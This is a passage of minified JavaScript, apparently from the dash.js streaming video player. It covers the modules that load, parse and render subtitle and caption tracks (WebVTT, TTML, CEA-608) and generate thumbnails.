D=r();D.timestampOffset===E||isNaN(E)||(D.timestampOffset=E)}},J=t.type===p.default.FRAGMENTED_TEXT?(0,f.default)(z).create({streamInfo:t.streamInfo,type:t.type,mediaPlayerModel:t.mediaPlayerModel,manifestModel:t.manifestModel,fragmentModel:t.fragmentModel,errHandler:t.errHandler,mediaController:t.mediaController,representationController:t.representationController,adapter:t.adapter,textController:t.textController,abrController:t.abrController,playbackController:t.playbackController,settings:t.settings}):(0,g.default)(z).create({streamInfo:t.streamInfo,type:t.type,mimeType:t.mimeType,fragmentModel:t.fragmentModel,errHandler:t.errHandler}),x}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(47)),f=v(u(114)),g=v(u(198));m.__dashjs_factory_name="TextBufferController",M.default=l.default.getClassFactory(m),da.exports=M.default},{108:108,114:114,198:198,47:47}],200:[function(u,da,M){function v(E){return E&&E.__esModule?E:{default:E}}function m(){function E(){return!(B&&!A)}var I,D=this.context,L=void 0,G=void 0,N=void 0,w=void 0,h=void 0,F=void 0,P=void 0,O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0,aa=void 0,ma=void 0,H=void 0,B=void 0,A=void 0,Y=void 0,Z=void 0,na=void 0;return I={setConfig:function(T){T&&(T.errHandler&&(G=T.errHandler),T.adapter&&(N=T.adapter),T.manifestModel&&(w=T.manifestModel),T.mediaController&&(h=T.mediaController),T.videoModel&&(F=T.videoModel),T.streamController&&(P=T.streamController),T.textTracks&&(O=T.textTracks),T.vttParser&&(R=T.vttParser),T.ttmlParser&&(Q=T.ttmlParser),L.setConfig({errHandler:G,adapter:N,manifestModel:w,mediaController:h,videoModel:F,streamController:P,textTracks:O,vttParser:R,ttmlParser:Q}))},getTextSourceBuffer:function(){return L},getAllTracksAreDisabled:function(){return B},addEmbeddedTrack:function(T){L.addEmbeddedTrack(T)},getTextDefaultLanguage:function(){return W&&W.lang||""},setTextDefaultLanguage:function(T){(0,J.checkParameterType)(T,"string"),(W=W||{}).lang=T,aa=!0},setTextDefaultEnabled:function(T){(0,J.checkParameterType)(T,"boolean"),(H=T)?B=!1:this.setTextTrack(-1)},getTextDefaultEnabled:function(){return void 0!==H&&H},setInitialSettings:function(T){W=T,aa=!0},enableText:function(T){(0,J.checkParameterType)(T,"boolean"),!H&&T&&(H=!0),E()!==T&&(T&&this.setTextTrack(ma),T||(ma=this.getCurrentTrackIdx(),Y?this.setTextTrack(-1):Z=!0))},isTextEnabled:E,setTextTrack:function(T){var pa=L.getConfig(),ia=pa.fragmentModel,S=pa.fragmentedTracks;pa=pa.videoModel;var V=void 0,oa=void 0;B=-1===T;var ba=O.getCurrentTrackIdx();if(ba!==T)if(B&&h&&h.saveTextSettingsDisabled(),O.setModeForTrackIdx(ba,p.default.TEXT_HIDDEN),O.setCurrentTrackIdx(T),O.setModeForTrackIdx(T,p.default.TEXT_SHOWING),(T=O.getCurrentTrackInfo())&&T.isFragmented&&!T.isEmbedded){for(var ha=0;ha<S.length;ha++)if(V=S[ha],T.lang===V.lang&&T.index===V.index&&(V.id?T.id===V.id:T.id===V.index))if(V!==h.getCurrentTrackFor(p.default.FRAGMENTED_TEXT,P.getActiveStreamInfo()))ia.abortRequests(),ia.removeExecutedRequestsBeforeTime(),L.remove(),O.deleteCuesFromTrackIdx(ba),h.setTrack(V),L.setCurrentFragmentedTrackIdx(ha);else if(-1===ba){var ka=P.getActiveStreamProcessors();for(V=0;V<ka.length;V++)if(ka[V].getType()===p.default.FRAGMENTED_TEXT){oa=ka[V];break}oa.setIndexHandlerTime(pa.getTime()),oa.getScheduleController().start()}}else if(T&&!T.isFragmented){for(ka=P.getActiveStreamProcessors(),ha=0;ha<ka.length;ha++)if(ka[ha].getType()===p.default.TEXT){V=(oa=ka[ha]).getMediaInfoArr();break}if(oa&&V)for(ha=0;ha<V.length;ha++)if(V[ha].index===T.index&&V[ha].lang===T.lang){oa.selectMediaInfo(V[ha]);break}}},getCurrentTrackIdx:function(){return O.getCurrentTrackIdx()},enableForcedTextStreaming:function(T){(0,J.checkParameterType)(T,"boolean"),A=T},reset:function(){Z=Y=!(B=!0),L.resetEmbedded(),L.reset()}},W=null,O=(Z=aa=Y=A=!(ma=-1),g.default)(D).getInstance(),R=(0,t.default)(D).getInstance(),Q=(0,r.default)(D).getInstance(),L=(0,f.default)(D).getInstance(),ja=(0,x.default)(D).getInstance(),O.initialize(),ja.on(z.default.TEXT_TRACKS_QUEUE_INITIALIZED,(function(T){var pa=this,ia=T.tracks,S=T.index;W&&ia.some((function(V,oa){if(h.matchSettings(W,V))return pa.setTextTrack(oa),S=oa,!0})),(!1===H||void 0===H&&!W||Z)&&this.setTextTrack(-1),ma=S,ja.trigger(z.default.TEXT_TRACKS_ADDED,{enabled:E(),index:S,tracks:ia}),Y=!0}),I),ja.on(z.default.CURRENT_TRACK_CHANGED,(function(T){var pa;aa||!T||!T.newMediaInfo||(pa=T.newMediaInfo).type===p.default.FRAGMENTED_TEXT&&(W={lang:pa.lang,role:pa.roles[0],accessibility:pa.accessibility[0]})}),I),ja.on(z.default.PERIOD_SWITCH_STARTED,(function(T){void 0===na&&null!==T.fromStreamInfo&&(na=this.getCurrentTrackIdx())}),I),ja.on(z.default.STREAM_COMPLETED,(function(){void 0===na&&(na=this.getCurrentTrackIdx())}),I),ja.on(z.default.PERIOD_SWITCH_COMPLETED,(function(){void 0!==na&&(this.setTextTrack(na),na=void 0)}),I),Z=Y=!(B=!0),I}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(47)),f=v(u(201)),g=v(u(202)),t=v(u(221)),r=v(u(219)),x=v(u(46)),z=v(u(54)),J=u(218);m.__dashjs_factory_name="TextController",M.default=l.default.getSingletonFactory(m),da.exports=M.default},{108:108,201:201,202:202,218:218,219:219,221:221,46:46,47:47,54:54}],201:[function(u,da,M){function v(w){return w&&w.__esModule?w:{default:w}}function m(){function w(){ha=NaN,fa=oa=null,ba=!(ka=[])}function h(Ra){(Ra=Ra.chunk).mediaInfo.embeddedCaptions&&O(Ra.bytes,Ra)}function F(){va=[],(V=(0,z.default)(ja).getInstance()).setConfig({videoModel:la}),V.initialize(),B=(0,g.default)(ja).getInstance(),Ca=[],aa=!(za=qa=null),Ba=(xa=0,J.default)(ja).getInstance();var La,Ra=C.getActiveStreamProcessors();for(La in Ra)if("video"===Ra[La].getType()){Ga=Ra[La].getRepresentationInfo().MSETimeOffset;break}W.on(L.default.VIDEO_CHUNK_RECEIVED,h,this),W.on(L.default.BUFFER_CLEARED,Q,this)}function P(Ra,La){var Ya,hb,bb=new f.default,Da={subtitle:"subtitles",caption:"captions"};bb.captionData=Ra,bb.lang=La.lang,bb.labels=La.labels,bb.id=La.id?La.id:La.index,bb.index=La.index,bb.isTTML=(Ya=!1,La.codec&&0<=La.codec.search(p.default.STPP)&&(Ya=!0),La.mimeType&&0<=La.mimeType.search(p.default.TTML)&&(Ya=!0),Ya),Ra=!1,1<va.length&&La.isEmbedded?Ra=La.id&&La.id===p.default.CC1:1===va.length?La.id&&"string"==typeof La.id&&"CC"===La.id.substring(0,2)&&(Ra=!0):0===va.length&&(Ra=La.index===S[0].index),bb.defaultTrack=Ra,bb.isFragmented=!Y.getIsTextTrack(La.mimeType),bb.isEmbedded=!!La.isEmbedded,bb.kind=(hb=0<La.roles.length?Da[La.roles[0]]:Da.caption)===Da.caption||hb===Da.subtitle?hb:Da.caption,bb.roles=La.roles,bb.accessibility=La.accessibility,V.addTextTrack(bb,(S?S.length:0)+va.length)}function O(Ra,La){var Ya=void 0,hb=void 0,bb=void 0,Da=void 0,Pa=void 0;if(Pa=Da=void 0,Da=(bb=La.mediaInfo).type,Pa=bb.mimeType,bb=bb.codec||Pa){if(Da===p.default.FRAGMENTED_TEXT)if(ba||"InitializationSegment"!==La.segmentType){if(ba)if(hb=(Da=B.getSamplesInfo(Ra)).sampleList,null===fa&&0<hb.length&&(fa=hb[0].cts-La.start*ha),0<=bb.search(p.default.STPP))for(T=null!==T?T:R(bb),bb=0;bb<hb.length;bb++){var eb=(La=hb[bb]).cts,Ta=eb-fa;this.buffered.add(Ta/ha,(Ta+La.duration)/ha),Ta=new DataView(Ra,La.offset,La.subSizes[0]),Pa=E.default.Utils.dataViewToString(Ta,p.default.UTF8),Ta=[];var qb=La.offset+La.subSizes[0];for(Da=1;Da<La.subSizes.length;Da++){var ib=new Uint8Array(Ra,qb,La.subSizes[Da]);ib=String.fromCharCode.apply(null,ib),Ta.push(ib),qb+=La.subSizes[Da]}try{var mb=Z.getValue().ttmlTimeIsRelative?eb/ha:0;Ya=T.parse(Pa,mb,eb/ha,(eb+La.duration)/ha,Ta),V.addCaptions(qa,fa/ha,Ya)}catch(Ab){oa.removeExecutedRequestsBeforeTime(),this.remove(),H.error("TTML parser error: "+Ab.message)}}else{for(Ya=[],bb=0;bb<hb.length;bb++)for((La=hb[bb]).cts-=fa,this.buffered.add(La.cts/ha,(La.cts+La.duration)/ha),mb=Ra.slice(La.offset,La.offset+La.size),mb=E.default.parseBuffer(mb),Da=0;Da<mb.boxes.length;Da++)if(ib=mb.boxes[Da],H.debug("VTT box1: "+ib.type),"vtte"!==ib.type&&"vttc"===ib.type)for(H.debug("VTT vttc boxes.length = "+ib.boxes.length),Pa=0;Pa<ib.boxes.length;Pa++){var Db=ib.boxes[Pa];H.debug("VTT box2: "+Db.type),"payl"===Db.type&&(eb=Db.cue_text,H.debug("VTT cue_text = "+eb),Ta=La.cts/ha,qb=(La.cts+La.duration)/ha,Ya.push({start:Ta,end:qb,data:eb,styles:{}}),H.debug("VTT "+Ta+"-"+qb+" : "+eb))}0<Ya.length&&V.addCaptions(qa,0,Ya)}}else ba=!0,ha=B.getMediaTimescaleFromMoov(Ra);else if(Da===p.default.TEXT){Ta=new DataView(Ra,0,Ra.byteLength),Pa=E.default.Utils.dataViewToString(Ta,p.default.UTF8);try{Ya=R(bb).parse(Pa,0),V.addCaptions(V.getCurrentTrackIdx(),0,Ya)}catch(Ab){A.error(new G.default(N.default.TIMED_TEXT_ERROR_ID_PARSE_CODE,N.default.TIMED_TEXT_ERROR_MESSAGE_PARSE+Ab.message,Pa))}}else if(Da===p.default.VIDEO)if(La.segmentType===l.HTTPRequest.INIT_SEGMENT_TYPE){if(0===xa)for(xa=B.getMediaTimescaleFromMoov(Ra),bb=0;bb<va.length;bb++)P(null,va[bb])}else{if(0===xa)return void H.warn("CEA-608: No timescale for embeddedTextTrack yet");if(hb=(Da=B.getSamplesInfo(Ra)).lastSequenceNumber,!Ca[0]&&!Ca[1])for(mb=Ya=void 0,bb=0;bb<va.length;bb++){if(va[bb].id===p.default.CC1?mb=V.getTrackIdxForId(p.default.CC1):va[bb].id===p.default.CC3&&(mb=V.getTrackIdxForId(p.default.CC3)),-1===mb)return void H.warn("CEA-608: data before track is ready.");Ya=function(Ab){return function(db,Za,$a){var ua;(ua=la.getTTMLRenderingDiv()?Ba.createHTMLCaptionsFromScreen(la.getElement(),db,Za,$a):[{start:db,end:Za,data:$a.getDisplayText(),styles:{}}])&&V.addCaptions(Ab,0,ua)}}(mb),Ca[bb]=new D.default.Cea608Parser(bb+1,{newCue:Ya},null)}if(xa){if(null!==za&&hb!==za+Da.numSequences)for(bb=0;bb<Ca.length;bb++)Ca[bb]&&Ca[bb].reset();for(Ra=function(Ab,db){if(0===db.length)return null;var Za={splits:[],fields:[[],[]]};Ab=new DataView(Ab);for(var $a=0;$a<db.length;$a++)for(var ua=db[$a],Ka=D.default.findCea608Nalus(Ab,ua.offset,ua.size),Fa=null,tb=0,Eb=0;Eb<Ka.length;Eb++)for(var Sa=D.default.extractCea608DataFromRange(Ab,Ka[Eb]),rb=0;2>rb;rb++)0<Sa[rb].length&&(ua.cts!==Fa?tb=0:tb+=1,Za.fields[rb].push([ua.cts+Ga*xa,Sa[rb],tb]),Fa=ua.cts);return Za.fields.forEach((function(nb){nb.sort((function(Bb,Ib){return Bb[0]===Ib[0]?Bb[2]-Ib[2]:Bb[0]-Ib[0]}))})),Za}(Ra,Da.sampleList),Ya=0;Ya<Ca.length;Ya++)if(mb=Ra.fields[Ya],La=Ca[Ya])for(bb=0;bb<mb.length;bb++)La.addData(mb[bb][0]/xa,mb[bb][1]);za=hb}}}else H.error("No text type defined")}function R(Ra){var La=void 0;return 0<=Ra.search(p.default.VTT)?La=pa:(0<=Ra.search(p.default.TTML)||0<=Ra.search(p.default.STPP))&&(La=ia),La}function Q(Ra){va.forEach((function(La){0<=(La=V.getTrackIdxForId(La.id))&&V.deleteCuesFromTrackIdx(La,Ra.from,Ra.to)}))}var ja=this.context,W=(0,I.default)(ja).getInstance(),aa=!1,ma=void 0,H=void 0,B=void 0,A=void 0,Y=void 0,Z=void 0,na=void 0,T=void 0,pa=void 0,ia=void 0,S=void 0,V=void 0,oa=void 0,ba=void 0,ha=void 0,ka=void 0,la=void 0,C=void 0,fa=void 0,qa=void 0,va=void 0,xa=void 0,za=void 0,Ca=void 0,Ba=void 0,Ga=void 0;return ma={initialize:function(Ra,La,Ya,hb){if(aa||F(),V.setConfig({videoModel:la}),V.initialize(),B=B||(0,g.default)(ja).getInstance(),Ra=!Y.getIsTextTrack(Ra),S=S.concat(Ya),Ra)for(oa=hb,ma.buffered=(0,t.default)(ja).create(),ka=na.getTracksFor(p.default.FRAGMENTED_TEXT,La),La=na.getCurrentTrackFor(p.default.FRAGMENTED_TEXT,La),Ya=0;Ya<ka.length;Ya++)if(ka[Ya]===La){qa=Ya;break}for(Ya=0;Ya<S.length;Ya++)P(null,S[Ya])},append:O,abort:function(){V.deleteAllTextTracks(),w(),B=null,S=[]},addEmbeddedTrack:function(Ra){if(aa||F(),Ra)if(Ra.id===p.default.CC1||Ra.id===p.default.CC3){for(var La=0;La<va.length;La++)if(va[La].id===Ra.id)return;va.push(Ra)}else H.warn("Embedded track "+Ra.id+" not supported!")},resetEmbedded:function(){W.off(L.default.VIDEO_CHUNK_RECEIVED,h,this),W.off(L.default.BUFFER_CLEARED,Q,this),V&&V.deleteAllTextTracks(),aa=!1,va=[],Ca=[null,null],za=null},setConfig:function(Ra){Ra&&(Ra.errHandler&&(A=Ra.errHandler),Ra.adapter&&(Y=Ra.adapter),Ra.manifestModel&&(Z=Ra.manifestModel),Ra.mediaController&&(na=Ra.mediaController),Ra.videoModel&&(la=Ra.videoModel),Ra.streamController&&(C=Ra.streamController),Ra.textTracks&&(V=Ra.textTracks),Ra.vttParser&&(pa=Ra.vttParser),Ra.ttmlParser&&(ia=Ra.ttmlParser))},getConfig:function(){return{fragmentModel:oa,fragmentedTracks:ka,videoModel:la}},setCurrentFragmentedTrackIdx:function(Ra){qa=Ra},remove:function(Ra,La){void 0===Ra&&Ra===La&&(Ra=this.buffered.start(0),La=this.buffered.end(this.buffered.length-1)),this.buffered.remove(Ra,La)},reset:function(){w(),S=[],V=la=C=T=null}},H=(0,x.default)(ja).getInstance().getLogger(ma),w(),S=[],T=null,ma}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=u(241),f=v(u(233)),g=v(u(206)),t=v(u(208)),r=v(u(47)),x=v(u(45)),z=v(u(202)),J=v(u(197)),E=v(u(9)),D=v(u(2)),I=v(u(46)),L=v(u(54)),G=v(u(225)),N=v(u(51));m.__dashjs_factory_name="TextSourceBuffer",M.default=r.default.getSingletonFactory(m),da.exports=M.default},{108:108,197:197,2:2,202:202,206:206,208:208,225:225,233:233,241:241,45:45,46:46,47:47,51:51,54:54,9:9}],202:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(){function z(pa,ia){var S=O.getClientWidth(),V=O.getClientHeight(),oa=O.getVideoWidth(),ba=O.getVideoHeight(),ha=O.getVideoRelativeOffsetTop(),ka=O.getVideoRelativeOffsetLeft();if(0!==oa&&0!==ba){var la=oa/ba,C=!1;pa.isFromCEA608&&(la=3.5/3,C=!0);var fa,xa,za,qa=0,va=0;if(oa/ba<S/V?qa=(va=V)/ba*oa:va=(qa=S)/oa*ba,ba=oa=0,la<qa/va?oa=(ba=va)*la:ba=(oa=qa)/la,xa=(S-oa)/2,za=(V-ba)/2,xa=(S=C?{x:xa+.1*oa,y:za+.1*ba,w:.8*oa,h:.8*ba}:{x:xa,y:za,w:oa,h:ba}).w,za=S.h,V=S.x,S=S.y,(xa!=ma||za!=H||V!=W||S!=aa||ia)&&(W=V+ka,aa=S+ha,ma=xa,H=za,!B||(fa=B.style)&&(fa.left=W+"px",fa.top=aa+"px",fa.width=ma+"px",fa.height=H+"px",fa.zIndex=Y&&document[Y]||Z?T:null,w.trigger(f.default.CAPTION_CONTAINER_RESIZE,{})),pa=pa.activeCues))for(ia=pa.length,ha=0;ha<ia;++ha)(ka=pa[ha]).scaleCue(ka)}}function J(pa){var ia,S=void 0,V=void 0,oa=void 0;if(pa.cellResolution){var ba=[ma/pa.cellResolution[0],H/pa.cellResolution[1]];if(pa.linePadding)for(S in pa.linePadding)if(pa.linePadding.hasOwnProperty(S))for(var ha=(pa.linePadding[S]*ba[0]).toString(),ka=document.getElementsByClassName("spanPadding"),la=0;la<ka.length;la++)ka[la].style.cssText=ka[la].style.cssText.replace(/(padding-left\s*:\s*)[\d.,]+(?=\s*px)/gi,"$1"+ha),ka[la].style.cssText=ka[la].style.cssText.replace(/(padding-right\s*:\s*)[\d.,]+(?=\s*px)/gi,"$1"+ha);if(pa.fontSize){for(S in pa.fontSize)if(pa.fontSize.hasOwnProperty(S))for("%"===pa.fontSize[S][0]?V=pa.fontSize[S][1]/100:"c"===pa.fontSize[S][0]&&(V=pa.fontSize[S][1]),ha=(V*ba[1]).toString(),ka="defaultFontSize"!==S?document.getElementsByClassName(S):document.getElementsByClassName("paragraph"),la=0;la<ka.length;la++)ka[la].style.cssText=ka[la].style.cssText.replace(/(font-size\s*:\s*)[\d.,]+(?=\s*px)/gi,"$1"+ha);if(pa.lineHeight)for(S in pa.lineHeight)if(pa.lineHeight.hasOwnProperty(S))for("%"===pa.lineHeight[S][0]?oa=pa.lineHeight[S][1]/100:"c"===pa.fontSize[S][0]&&(oa=pa.lineHeight[S][1]),ha=(oa*ba[1]).toString(),ka=document.getElementsByClassName(S),V=0;V<ka.length;V++)ka[V].style.cssText=ka[V].style.cssText.replace(/(line-height\s*:\s*)[\d.,]+(?=\s*px)/gi,"$1"+ha)}}pa.isd&&((ia=document.getElementById(pa.cueID))&&B.removeChild(ia),E(pa))}function E(pa){var ia;B&&(ia=document.createElement("div"),B.appendChild(ia),na=(0,r.renderHTML)(pa.isd,ia,(function(S){var V=/^(urn:)(mpeg:[a-z0-9][a-z0-9-]{0,31}:)(subs:)([0-9]+)$/,oa=/^#(.*)$/;return V.test(S)?(S=V.exec(S),S=parseInt(S[4],10)-1,"data:image/png;base64,"+btoa(pa.images[S])):oa.test(S)?(S=oa.exec(S)[1],"data:image/png;base64,"+pa.embeddedImages[S]):null}),B.clientHeight,B.clientWidth,!1,(function(S){F.info("renderCaption :",S)}),na,!0),ia.id=pa.cueID,w.trigger(f.default.CAPTION_RENDERED,{captionDiv:ia,currentTrackIdx:ja}))}function D(pa){return 0<=pa&&R[pa]?O.getTextTrack(R[pa].kind,R[pa].id,R[pa].lang,R[pa].isTTML,R[pa].isEmbedded):null}function I(pa){if(pa!==ja){if(pa=D(ja=pa),G.call(this),pa&&"html"===pa.renderingType){var ia=document.getElementById("native-cue-style");if(!ia){(ia=document.createElement("style")).id="native-cue-style",document.head.appendChild(ia),ia=ia.sheet;var S=O.getElement();try{S&&(S.id?ia.insertRule("#"+S.id+"::cue {background: transparent}",0):0!==S.classList.length?ia.insertRule("."+S.className+"::cue {background: transparent}",0):ia.insertRule("video::cue {background: transparent}",0))}catch(V){F.info(""+V.message)}}}else(ia=document.getElementById("native-cue-style"))&&document.head.removeChild(ia);A&&(clearInterval(A),A=null),pa&&"html"===pa.renderingType&&(z.call(this,pa,!0),A=setInterval(z.bind(this,pa),500))}}function L(pa,ia,S){if(pa.cues)for(var V=pa.cues,oa=V.length-1;0<=oa;oa--){var ba=V[oa],ha=ia,ka=S;(isNaN(ha)||ba.startTime>=ha)&&(isNaN(ka)||ba.endTime<=ka)&&pa.removeCue(V[oa])}}function G(){if(B)for(;B.firstChild;)B.removeChild(B.firstChild)}var h,N=this.context,w=(0,l.default)(N).getInstance(),F=void 0,P=void 0,O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0,aa=void 0,ma=void 0,H=void 0,B=void 0,A=void 0,Y=void 0,Z=void 0,na=void 0,T=void 0;return h={initialize:function(){void 0!==wa&&"undefined"!=typeof navigator&&(P=wa.VTTCue||wa.TextTrackCue,R=[],Q=[],Z=!(ja=-1),T=2147483647,na=A=B=null,void(H=ma=aa=W=0)!==document.fullscreenElement?Y="fullscreenElement":void 0!==document.webkitIsFullScreen?Y="webkitIsFullScreen":document.msFullscreenElement?Y="msFullscreenElement":document.mozFullScreen&&(Y="mozFullScreen"))},setDisplayCConTop:function(pa){(0,x.checkParameterType)(pa,"boolean"),Z=pa,B&&!document[Y]&&(B.style.zIndex=pa?T:null)},addTextTrack:function(pa,ia){var S=this;R.length!==ia?(R.push(pa),R.length===ia&&function(){R.sort((function(ha,ka){return ha.index-ka.index})),B=O.getTTMLRenderingDiv();for(var V=-1,oa=0;oa<R.length;oa++){var ba=O.addTextTrack(R[oa].kind,void 0!==R[oa].id?R[oa].id:R[oa].lang,R[oa].lang,R[oa].isTTML,R[oa].isEmbedded);Q.push(ba),R[oa].defaultTrack&&(ba.default=!0,V=oa),(ba=D(oa))&&(ba.mode=p.default.TEXT_SHOWING,B&&(R[oa].isTTML||R[oa].isEmbedded)?ba.renderingType="html":ba.renderingType="default"),S.addCaptions(oa,0,R[oa].captionData),w.trigger(f.default.TEXT_TRACK_ADDED)}I.call(S,V),0<=V&&function(){w.on(f.default.PLAYBACK_METADATA_LOADED,(function C(){var fa=D(V);fa&&z.call(this,fa,!0),w.off(f.default.PLAYBACK_METADATA_LOADED,C,this)}),S);for(var ha=0;ha<R.length;ha++){var ka=D(ha);ka&&(ka.mode=ha===V?p.default.TEXT_SHOWING:p.default.TEXT_HIDDEN)}}(),w.trigger(f.default.TEXT_TRACKS_QUEUE_INITIALIZED,{index:ja,tracks:R})}()):F.error("Trying to add too many tracks.")},addCaptions:function(pa,ia,S){var V=D(pa),oa=this;if(V&&Array.isArray(S)&&0!==S.length)for(pa=0;pa<S.length;pa++){var ba=void 0,ha=S[pa];V.cellResolution=ha.cellResolution,V.isFromCEA608=ha.isFromCEA608,"html"===ha.type&&B?((ba=new P(ha.start-ia,ha.end-ia,"")).cueHTMLElement=ha.cueHTMLElement,ba.isd=ha.isd,ba.images=ha.images,ba.embeddedImages=ha.embeddedImages,ba.cueID=ha.cueID,ba.scaleCue=J.bind(oa),ba.cellResolution=ha.cellResolution,ba.lineHeight=ha.lineHeight,ba.linePadding=ha.linePadding,ba.fontSize=ha.fontSize,B.style.left=W+"px",B.style.top=aa+"px",B.style.width=ma+"px",B.style.height=H+"px",ba.onenter=function(){V.mode===p.default.TEXT_SHOWING&&(this.isd?(E(this),F.debug("Cue enter id:"+this.cueID)):(B.appendChild(this.cueHTMLElement),J.call(oa,this),w.trigger(f.default.CAPTION_RENDERED,{captionDiv:this.cueHTMLElement,currentTrackIdx:ja})))},ba.onexit=function(){if(B)for(var ka=B.childNodes,la=0;la<ka.length;++la)ka[la].id===this.cueID&&(F.debug("Cue exit id:"+ka[la].id),B.removeChild(ka[la]),--la)}):ha.data&&(ba=new P(ha.start-ia,ha.end-ia,ha.data),ha.styles&&(void 0!==ha.styles.align&&"align"in ba&&(ba.align=ha.styles.align),void 0!==ha.styles.line&&"line"in ba&&(ba.line=ha.styles.line),void 0!==ha.styles.position&&"position"in ba&&(ba.position=ha.styles.position),void 0!==ha.styles.size&&"size"in ba&&(ba.size=ha.styles.size)),ba.onenter=function(){V.mode===p.default.TEXT_SHOWING&&w.trigger(f.default.CAPTION_RENDERED,{currentTrackIdx:ja})});try{ba?V.addCue(ba):F.error("impossible to display subtitles.")}catch(ka){throw L(V),V.addCue(ba),ka}}},getCurrentTrackIdx:function(){return ja},setCurrentTrackIdx:I,getTrackIdxForId:function(pa){for(var ia=-1,S=0;S<R.length;S++)if(R[S].id===pa){ia=S;break}return ia},getCurrentTrackInfo:function(){return R[ja]},setModeForTrackIdx:function(pa,ia){(pa=D(pa))&&pa.mode!==ia&&(pa.mode=ia)},deleteCuesFromTrackIdx:function(pa,ia,S){(pa=D(pa))&&L(pa,ia,S)},deleteAllTextTracks:function(){for(var pa=Q?Q.length:0,ia=0;ia<pa;ia++){var S=D(ia);S&&(L.call(this,S),S.mode="disabled")}Q=[],R=[],A&&(clearInterval(A),A=null),ja=-1,G.call(this)},deleteTextTrack:function(pa){O.removeChild(Q[pa]),Q.splice(pa,1)},setConfig:function(pa){pa&&pa.videoModel&&(O=pa.videoModel)}},F=(0,t.default)(N).getInstance().getLogger(h),h}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(46)),f=v(u(54)),g=v(u(47)),t=v(u(45)),r=u(17),x=u(218);m.__dashjs_factory_name="TextTracks",M.default=g.default.getSingletonFactory(m),da.exports=M.default},{108:108,17:17,218:218,45:45,46:46,47:47,54:54}],203:[function(u,da,M){function v(x){return x&&x.__esModule?x:{default:x}}function m(x){function z(){D&&D.reset()}var J,E=this.context,D=void 0;return J={provide:function(I,L){if("function"==typeof L){var G=D.getCurrentTrack(),N=void 0;if(!G||0>=G.segmentDuration||null==I)L(null);else{isNaN(G.segmentDuration)&&(N=D.getThumbnailRequestForTime(I))&&(G.segmentDuration=N.duration);var h,F,P,w=I%G.segmentDuration;w=Math.floor(w*G.tilesHor*G.tilesVert/G.segmentDuration);var O=new f.default;if(O.width=Math.floor(G.widthPerTile),O.height=Math.floor(G.heightPerTile),O.x=Math.floor(w%G.tilesHor)*G.widthPerTile,O.y=Math.floor(w/G.tilesHor)*G.heightPerTile,"readThumbnail"in G)return G.readThumbnail(I,(function(R){O.url=R,L(O)}));N?(O.url=N.url,G.segmentDuration=NaN):(h=Math.floor(I/G.segmentDuration),O.url=(F=h+G.startNumber,P=(0,r.replaceTokenForTemplate)(G.templateUrl,"Number",F),P=(0,r.replaceTokenForTemplate)(P,"Time",(F-1)*G.segmentDuration),P=(0,r.replaceTokenForTemplate)(P,"Bandwidth",G.bandwidth),(0,r.unescapeDollarsInTemplate)(P))),L(O)}}},setTrackByIndex:function(I){D.setTrackByIndex(I)},getCurrentTrackIndex:function(){return D.getCurrentTrackIndex()},getBitrateList:function(){var I=0;return D.getTracks().map((function(L){var G=new t.default;return G.mediaType=l.default.IMAGE,G.qualityIndex=I++,G.bitrate=L.bitrate,G.width=L.width,G.height=L.height,G}))},reset:z},z(),D=(0,g.default)(E).create({streamInfo:x.streamInfo,adapter:x.adapter,baseURLController:x.baseURLController,timelineConverter:x.timelineConverter,debug:x.debug,eventBus:x.eventBus,events:x.events,dashConstants:x.dashConstants}),J}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(108)),f=v(u(234)),g=v(u(204)),t=v(u(224)),r=u(80);m.__dashjs_factory_name="ThumbnailController",M.default=p.default.getClassFactory(m),da.exports=M.default},{108:108,204:204,224:224,234:234,47:47,80:80}],204:[function(u,da,M){function v(D){return D&&D.__esModule?D:{default:D}}function m(D){function I(){G(),Y=(0,z.default)(w).create({}),Z=(0,x.default)(w).getInstance(),(H=(0,J.default)(w).create({timelineConverter:O,baseURLController:F,debug:R,eventBus:Q,events:ja,dashConstants:W,urlUtils:aa})).initialize(!!h&&h.getIsDynamic()),function(){if(P&&h&&(A=h.getMediaInfoForType(P,p.default.IMAGE))){var na=h.getVoRepresentations(A);na&&0<na.length&&na.forEach((function(T){(T.segmentInfoType===l.default.SEGMENT_TEMPLATE&&0<T.segmentDuration&&T.media||T.segmentInfoType===l.default.SEGMENT_TIMELINE)&&L(T),T.segmentInfoType===l.default.SEGMENT_BASE&&L(T,!0)})),0<ma.length&&(ma.sort((function(T,pa){return T.bitrate-pa.bitrate})),B=ma.length-1)}}()}function L(na,T){var pa,ia=new f.default;ia.id=na.id,ia.bitrate=na.bandwidth,ia.width=na.width,ia.height=na.height,ia.tilesHor=1,ia.tilesVert=1,na.essentialProperties&&na.essentialProperties.forEach((function(S){var V;0<=E.indexOf(S.schemeIdUri)&&S.value&&(2!==(V=S.value.split("x")).length||isNaN(V[0])||isNaN(V[1])||(ia.tilesHor=parseInt(V[0],10),ia.tilesVert=parseInt(V[1],10)))})),T?Q.trigger(r.default.SEGMENTBASE_SEGMENTSLIST_REQUEST_NEEDED,{mimeType:A.mimeType,mediaType:p.default.IMAGE,representation:na,callback:function(S,V){var oa=[];S=function(ba,ha){for(var ka=[],la=0,C=void 0,fa=0,qa=ba.length;fa<qa;fa++){var va=ba[fa];(C=(0,t.getTimeBasedSegment)(O,h.getIsDynamic(),ha,va.startTime,va.duration,va.timescale,va.media,va.mediaRange,la))&&(ka.push(C),C=null,la++)}return ka}(S,V),ia.segmentDuration=S[0].duration,ia.readThumbnail=function(ba,ha){var ka=null;oa.some((function(la){if(la.start<=ba&&la.end>ba)return ka=la.url,!0})),ka?ha(ka):S.some((function(la){if(la.mediaStartTime<=ba&&la.mediaStartTime+la.duration>ba){var C=F.resolve(V.path);return Y.load({method:"get",url:C.url,request:{range:la.mediaRange,responseType:"arraybuffer"},onload:function(fa){var qa=Z.getSamplesInfo(fa.target.response);fa=new 